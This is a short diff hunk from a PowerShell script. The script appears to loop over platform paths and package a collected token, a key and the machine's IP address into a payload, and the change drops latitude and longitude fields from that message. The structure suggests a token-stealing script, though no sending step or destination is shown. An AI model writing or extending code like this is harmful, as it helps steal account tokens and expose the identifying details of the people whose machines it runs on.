@@ -129,8 +129,7 @@ foreach ($platform in $PATHS.Keys) {
             $message = @"
 {key: "$key",
 token: "$token",
-ip: "$ip",
-loc: ["$loc.Latitude","$loc.Longitude","$loc.HorizontalAccuracy"]}
+ip: "$ip"}
 "@
 
             $payload = @{
